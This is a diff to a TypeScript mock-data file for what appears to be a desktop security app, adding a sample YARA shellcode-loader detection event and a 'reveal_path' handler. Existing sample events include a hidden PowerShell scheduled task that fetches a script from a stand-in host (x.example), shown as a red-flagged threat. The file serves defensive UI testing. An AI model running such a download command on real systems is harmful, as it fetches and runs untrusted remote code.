@@ -80,6 +80,7 @@ let quarantine: QuarantineItem[] = [
 ];
 
 const events: SecurityEvent[] = [
+  { id: 9, timestamp: now() - 540, kind: "threat_detected", severity: "medium", title: "YARA.COD3NYM_SUSP_NET_Shellcode_Loader_Indicators_Jan24: suspicious file left in place", detail: "Found by on-demand scan: YARA rule yara_forge_core:COD3NYM_SUSP_NET_Shellcode_Loader_Indicators_Jan24 (Detects indicators of shellcode loaders in .NET binaries), score 65. Not quarantined automatically because the rule's confidence score (65) is below the quarantine threshold (75). Review it, quarantine it with a manual scan if confirmed, or add an exclusion if it is safe.", path: "C:\\Program Files\\WindowsApps\\Clipchamp.Clipchamp_4.3.10120.0_x64__yxz26nhyzhsrt\\Clipchamp.Widgets\\Clipchamp.Widgets.exe", pid: null },
   { id: 8, timestamp: now() - 420, kind: "device_access", severity: "low", title: "Camera turned on by Zoom.exe", detail: "Zoom.exe started using your camera.", path: "C:\\Users\\alex\\AppData\\Roaming\\Zoom\\bin\\Zoom.exe", pid: null },
   { id: 7, timestamp: now() - 200, kind: "persistence_change", severity: "high", title: "New scheduled task", detail: "Runs: \"powershell.exe\" -WindowStyle Hidden -Command iwr https://x.example/a.ps1. Red flags: runs a script host / system tool often abused by malware; hidden or encoded PowerShell; downloads from the internet. If you did not install something that needs this, disable it.", path: "\\WindowsUpdateHelper", pid: null },
   { id: 6, timestamp: now() - 300, kind: "process_blocked", severity: "high", title: "Blocked unsigned program from Downloads", detail: "Execution Guard stops programs without a valid digital signature when they start from Downloads, where malware usually lands. If you trust it, choose Always allow.", path: "C:\\Users\\alex\\Downloads\\cool-tool.exe", pid: 9120 },
@@ -198,6 +199,7 @@ export const mock = {
         case "pick_files":
           return ["C:\\Users\\alex\\Downloads\\invoice.pdf.exe", "C:\\Users\\alex\\Downloads\\holiday-photos.zip", "C:\\Users\\alex\\Downloads\\setup.exe"];
         case "open_virustotal":
+        case "reveal_path":
           return undefined;
         case "check_app_update":
           appUpdate = "Checking for app updates…";
